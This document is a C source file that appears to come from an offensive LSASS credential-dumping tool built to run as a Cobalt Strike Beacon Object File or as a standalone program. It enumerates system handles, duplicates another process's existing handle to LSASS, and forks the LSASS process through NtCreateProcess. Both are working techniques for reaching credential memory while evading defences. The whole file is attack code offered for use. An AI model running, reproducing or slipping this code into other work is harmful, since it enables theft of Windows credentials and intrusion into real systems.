#include "../include/handle.h"
#include "../include/modules.h"

HANDLE get_process_handle(
    DWORD dwPid,
    DWORD dwFlags,
    BOOL quiet
)
{
    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(
        &ObjectAttributes,
        NULL,
        0,
        NULL,
        NULL
    );
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    status = NtOpenProcess(
        &hProcess,
        dwFlags,
        &ObjectAttributes,
        &uPid
    );

    if (status == STATUS_INVALID_CID)
    {
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "There is no process with the PID %ld.\n",
                dwPid
            );
        }
        return NULL;
    }
    if (status == STATUS_ACCESS_DENIED)
    {
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Could not open a handle to %ld\n",
                dwPid
            );
        }
        return NULL;
    }
    else if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtOpenProcess, status: 0x%lx\n",
                status
            );
        }
#endif
        return NULL;
    }

    return hProcess;
}

PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
{
    NTSTATUS status;
    ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);
    PVOID handleTableInformation = intAlloc(buffer_size);
    if (!handleTableInformation)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
            buffer_size,
            GetLastError()
        );
#endif
        return NULL;
    }
    while (TRUE)
    {
        //get information of all the existing handles
        status = NtQuerySystemInformation(
            SystemHandleInformation,
            handleTableInformation,
            buffer_size,
            &buffer_size
        );
        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            // the buffer was too small, buffer_size now has the new length
            intFree(handleTableInformation); handleTableInformation = NULL;
            handleTableInformation = intAlloc(buffer_size);
            if (!handleTableInformation)
            {
#ifdef DEBUG
#ifdef BOF
                BeaconPrintf(CALLBACK_ERROR,
#else
                printf(
#endif
                    "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
                    buffer_size,
                    GetLastError()
                );
#endif
                return NULL;
            }
            continue;
        }
        if (!NT_SUCCESS(status))
        {
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtQuerySystemInformation, status: 0x%lx\n",
                status
            );
#endif
            intFree(handleTableInformation); handleTableInformation = NULL;
            return NULL;
        }
        return handleTableInformation;
    }
}

BOOL process_is_included(
    PPROCESS_LIST process_list,
    ULONG ProcessId
)
{
    for (ULONG i = 0; i < process_list->Count; i++)
    {
        if (process_list->ProcessId[i] == ProcessId)
            return TRUE;
    }
    return FALSE;
}

PPROCESS_LIST get_processes_from_handle_table(
    PSYSTEM_HANDLE_INFORMATION handleTableInformation
)
{
    PPROCESS_LIST process_list = intAlloc(sizeof(PROCESS_LIST));
    if (!process_list)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
            (ULONG32)sizeof(PROCESS_LIST),
            GetLastError()
        );
#endif
        return NULL;
    }

    PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
    for (ULONG i = 0; i < handleTableInformation->Count; i++)
    {
        handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];

        if (!process_is_included(process_list, handleInfo->ProcessId))
        {
            if (process_list->Count + 1 > MAX_PROCESSES)
            {
#ifdef BOF
                BeaconPrintf(CALLBACK_ERROR,
#else
                printf(
#endif
                    "Too many processes, please increase MAX_PROCESSES\n"
                );
                intFree(process_list); process_list = NULL;
                return NULL;
            }
            process_list->ProcessId[process_list->Count++] = handleInfo->ProcessId;
        }
    }
    return process_list;
}

POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
{
    NTSTATUS status;
    ULONG BufferLength = 0x1000;
    POBJECT_TYPES_INFORMATION obj_type_information;
    do
    {
        obj_type_information = intAlloc(BufferLength);
        if (!obj_type_information)
        {
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
                BufferLength,
                GetLastError()
            );
#endif
            return NULL;
        }

        status = NtQueryObject(
            NULL,
            ObjectTypesInformation,
            obj_type_information,
            BufferLength,
            &BufferLength
        );

        if (NT_SUCCESS(status))
            return obj_type_information;

        intFree(obj_type_information); obj_type_information = NULL;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

#ifdef DEBUG
#ifdef BOF
    BeaconPrintf(CALLBACK_ERROR,
#else
    printf(
#endif
        "Failed to call NtQueryObject, status: 0x%lx\n",
        status
    );
#endif
    return NULL;
}

BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
{
    POBJECT_TYPES_INFORMATION ObjectTypes;
    POBJECT_TYPE_INFORMATION_V2 CurrentType;

    ObjectTypes = QueryObjectTypesInfo();
    if (!ObjectTypes)
        return FALSE;

    CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
    for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
    {
        if (!_wcsicmp(CurrentType->TypeName.Buffer, PROCESS_TYPE))
        {
            *ProcesTypeIndex = i + 2;
            return TRUE;
        }
        CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
    }
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Index of type 'Process' not found\n"
        );
#endif
    return FALSE;
}

HANDLE duplicate_lsass_handle(
    DWORD lsass_pid
)
{
    NTSTATUS status;
    BOOL success;

    ULONG ProcesTypeIndex = 0;
    success = GetTypeIndexByName(&ProcesTypeIndex);
    if (!success)
        return NULL;

    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
    if (!handleTableInformation)
        return NULL;

    PPROCESS_LIST process_list = get_processes_from_handle_table(handleTableInformation);
    if (!process_list)
    {
        intFree(handleTableInformation); handleTableInformation = NULL;
        return NULL;
    }

    DWORD local_pid = (DWORD)READ_MEMLOC(CID_OFFSET);

    // loop over each ProcessId
    for (ULONG i = 0; i < process_list->Count; i++)
    {
        ULONG ProcessId = process_list->ProcessId[i];

        if (ProcessId == local_pid)
            continue;
        if (ProcessId == lsass_pid)
            continue;
        if (ProcessId == 0)
            continue;
        if (ProcessId == 4)
            continue;

        // we will open a handle to this ProcessId later on
        HANDLE hProcess = NULL;

        // loop over each handle of this ProcessId
        for (ULONG j = 0; j < handleTableInformation->Count; j++)
        {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

            // make sure this handle is from the current ProcessId
            if (handleInfo->ProcessId != ProcessId)
                continue;

            // make sure the handle has the permissions we need
            if ((handleInfo->GrantedAccess & (LSASS_PERMISSIONS)) != (LSASS_PERMISSIONS))
                continue;

            // make sure the handle is of type 'Process'
            if (handleInfo->ObjectTypeNumber != ProcesTypeIndex)
                continue;

            if (!hProcess)
            {
                // open a handle to the process with PROCESS_DUP_HANDLE
                hProcess = get_process_handle(
                    ProcessId,
                    PROCESS_DUP_HANDLE,
                    TRUE
                );
                if (!hProcess)
                    break;
            }

            // duplicate the handle
            HANDLE hDuped = NULL;
            status = NtDuplicateObject(
                hProcess,
                (HANDLE)(DWORD_PTR)handleInfo->Handle,
                NtCurrentProcess(),
                &hDuped,
                LSASS_PERMISSIONS,
                0,
                0
            );
            if (!NT_SUCCESS(status))
                continue;

            if (is_lsass(hDuped))
            {
                // found LSASS handle
#ifdef BOF
                BeaconPrintf(CALLBACK_OUTPUT,
#else
                printf(
#endif
                    "Found LSASS handle: 0x%x, on process: %ld\n",
                    handleInfo->Handle,
                    handleInfo->ProcessId
                );
                intFree(handleTableInformation); handleTableInformation = NULL;
                intFree(process_list); process_list = NULL;
                NtClose(hProcess); hProcess = NULL;
                return hDuped;
            }
            NtClose(hDuped); hDuped = NULL;
        }
        if (hProcess)
        {
            NtClose(hProcess); hProcess = NULL;
        }
    }

#ifdef BOF
    BeaconPrintf(CALLBACK_ERROR,
#else
    printf(
#endif
        "No handle to the LSASS process was found\n"
    );

    intFree(handleTableInformation); handleTableInformation = NULL;
    intFree(process_list); process_list = NULL;
    return NULL;
}

HANDLE fork_lsass_process(
    DWORD dwPid
)
{
    // open handle to LSASS with PROCESS_CREATE_PROCESS
    HANDLE hProcess = get_process_handle(
        dwPid,
        PROCESS_CREATE_PROCESS,
        FALSE
    );
    if (!hProcess)
        return NULL;

    // fork the LSASS process
    HANDLE hCloneProcess = NULL;
    OBJECT_ATTRIBUTES CloneObjectAttributes;

    InitializeObjectAttributes(
        &CloneObjectAttributes,
        NULL,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    NTSTATUS status = NtCreateProcess(
        &hCloneProcess,
        GENERIC_ALL,
        &CloneObjectAttributes,
        hProcess,
        TRUE,
        NULL,
        NULL,
        NULL
    );
    NtClose(hProcess); hProcess = NULL;

    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtCreateProcess, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }

    return hCloneProcess;
}
